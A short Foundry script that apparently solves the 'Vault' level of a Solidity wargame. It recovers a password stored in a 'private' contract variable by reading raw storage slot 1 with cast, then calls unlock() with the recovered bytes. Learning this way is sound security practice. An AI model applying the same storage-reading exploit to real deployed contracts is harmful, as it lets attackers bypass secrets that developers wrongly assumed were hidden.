// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/8_Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract VaultSolution is Script {
    Vault public vault = Vault(0x1583C016A89d7A6a211429236eB5D0de39A5F631);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // * cast storage 0x1583C016A89d7A6a211429236eB5D0de39A5F631 1

        vault.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();
        
    }
}
